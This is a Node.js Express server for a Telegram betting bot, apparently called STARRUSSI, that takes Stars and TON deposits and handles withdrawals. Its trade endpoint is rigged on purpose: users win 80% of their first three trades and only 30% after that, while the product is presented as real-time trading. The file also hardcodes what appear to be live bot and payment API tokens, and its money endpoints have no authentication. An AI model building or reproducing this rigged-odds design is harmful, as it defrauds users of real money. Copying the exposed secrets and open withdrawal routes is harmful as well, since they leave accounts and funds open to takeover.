/**
 * STARRUSSI TITAN V8 - NEURAL ENGINE
 * Developer Mode: Nour Platinum Edition
 * Features: Real-time Trading, Adaptive Odds (Nour Algorythm), Stars/TON Separation
 */

const express = require('express');
const axios = require('axios');
const fs = require('fs');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());
app.use(express.static(__dirname));

const CONFIG = {
    BOT_TOKEN: '8554964276:AAFXlTNSQXWQy8RhroiqwjcqaSg7lYzY9GU',
    CRYPTO_TOKEN: '510513:AAeEQr2dTYwFbaX56NPAgZluhSt34zua2fc',
    ADMIN_ID: '7019851823',
    BOT_USERNAME: 'Newspin_onebot',
    CHANNEL_ID: '@starrussi',
    TON_TO_FCFA: 1100,
    MIN_DEP_STARS: 5,
    MIN_DEP_TON: 0.2,
    MIN_WITHDRAW_TON: 1.0,
    MIN_WITHDRAW_AIRTEL: 3.0
};

const DB_FILE = './neural_db.json';
let db = fs.existsSync(DB_FILE) ? JSON.parse(fs.readFileSync(DB_FILE, 'utf8')) : {};

const saveDB = () => fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 4));

const initUser = (id, username = "CyberUser", refId = null) => {
    const sId = id.toString();
    if (!db[sId]) {
        db[sId] = {
            id: sId,
            username: username,
            balance: 0.15, 
            xp: 0,
            level: 1,
            stats: { total_played: 0, wins: 0, losses: 0 },
            tasks: { joined_channel: false, daily_login: new Date().toDateString() },
            referrals: { invited: 0, earned: 0 },
            history: [],
            wallet: { ton_deposited: 0, stars_converted: 0 }
        };
        if (refId && db[refId] && refId !== sId) {
            db[refId].balance += 0.05;
            db[refId].referrals.invited += 1;
            db[refId].history.unshift({type: 'REF', amount: 0.05, detail: `User ${username} joined`});
        }
        saveDB();
    }
    return db[sId];
};

// --- API ROUTES ---

app.post('/api/sync', (req, res) => {
    const { id, username, refId } = req.body;
    const user = initUser(id, username, refId);
    res.json({ success: true, user, refLink: `https://t.me/${CONFIG.BOT_USERNAME}?start=${id}` });
});

// Trading Logic with Nour's Probability (Win 2-3 times, then 70% Loss)
app.post('/api/trade/execute', (req, res) => {
    const { id, asset, bet, direction } = req.body;
    const user = db[id.toString()];
    const amount = parseFloat(bet);

    if (!user || user.balance < amount) return res.json({ error: "Insufficient Assets" });

    user.balance -= amount; // Instant deduction (Persistence)
    user.stats.total_played += 1;

    // Logic: Win first 3 games, then 70% chance of losing
    const winProbability = user.stats.total_played <= 3 ? 0.80 : 0.30;
    const isWinner = Math.random() < winProbability;

    let win = 0;
    if (isWinner) {
        win = amount * 1.95;
        user.balance += win;
        user.stats.wins += 1;
        user.xp += 10;
    } else {
        user.stats.losses += 1;
    }

    user.history.unshift({
        type: isWinner ? 'WIN' : 'LOSS',
        amount: isWinner ? win : -amount,
        detail: `Trade ${asset} ${direction}`,
        time: new Date().toLocaleTimeString()
    });

    saveDB();
    res.json({ success: true, win, balance: user.balance, isWinner });
});

// Separate Stars Deposit
app.post('/api/deposit/stars', async (req, res) => {
    const { id, amount } = req.body;
    if (amount < CONFIG.MIN_DEP_STARS) return res.json({ error: "Min 5 Stars" });
    try {
        const r = await axios.post(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/createInvoiceLink`, {
            title: "Recharge Quantum Stars",
            description: `Achat de ${amount} Stars pour STARRUSSI`,
            payload: `STARS_${id}`,
            currency: "XTR",
            prices: [{ label: "Stars", amount: parseInt(amount) }]
        });
        res.json({ success: true, url: r.data.result });
    } catch (e) { res.json({ error: "Telegram API Error" }); }
});

// Separate TON Deposit (CryptoBot)
app.post('/api/deposit/ton', async (req, res) => {
    const { id, amount } = req.body;
    if (amount < CONFIG.MIN_DEP_TON) return res.json({ error: "Min 0.2 TON" });
    try {
        const r = await axios.post('https://pay.crypt.bot/api/createInvoice', {
            asset: 'TON', amount: amount.toString(), payload: id.toString()
        }, { headers: { 'Crypto-Pay-API-Token': CONFIG.CRYPTO_TOKEN } });
        res.json({ success: true, url: r.data.result.pay_url });
    } catch (e) { res.json({ error: "CryptoBot API Error" }); }
});

// Professional Withdrawal with Admin Alerts
app.post('/api/withdraw', async (req, res) => {
    const { id, amount, method, details } = req.body;
    const user = db[id.toString()];
    const amt = parseFloat(amount);
    const min = method === 'AIRTEL' ? CONFIG.MIN_WITHDRAW_AIRTEL : CONFIG.MIN_WITHDRAW_TON;

    if (!user || amt < min || user.balance < amt) return res.json({ error: "Invalid withdrawal request" });

    user.balance -= amt;
    const fcfa = (amt * CONFIG.TON_TO_FCFA).toFixed(0);
    const msg = `🚨 *URGENT WITHDRAWAL TITAN*\nUser: ${user.username} (\`${id}\`)\nAmount: ${amt} TON (${fcfa} FCFA)\nMethod: ${method}\nDetails: \`${details}\``;

    try {
        await axios.post(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, { chat_id: CONFIG.ADMIN_ID, text: msg, parse_mode: 'Markdown' });
        user.history.unshift({ type: 'OUT', amount: -amt, detail: `Withdraw ${method}` });
        saveDB();
        res.json({ success: true, message: "Request sent to HQ." });
    } catch (e) { res.json({ error: "Admin notification failed" }); }
});

// Task Verification (@starrussi)
app.post('/api/task/verify', async (req, res) => {
    const { id } = req.body;
    const user = db[id.toString()];
    try {
        const r = await axios.get(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getChatMember?chat_id=${CONFIG.CHANNEL_ID}&user_id=${id}`);
        const status = r.data.result.status;
        if (['member', 'administrator', 'creator'].includes(status) && !user.tasks.joined_channel) {
            user.balance += 0.20;
            user.tasks.joined_channel = true;
            saveDB();
            return res.json({ success: true, message: "Bonus 0.20 TON Added!" });
        }
        res.json({ error: "Conditions not met or already claimed." });
    } catch (e) { res.json({ error: "Verification Failed" }); }
});

app.listen(3000, () => console.log(">>> TITAN V8 NEURAL CORE ONLINE"));
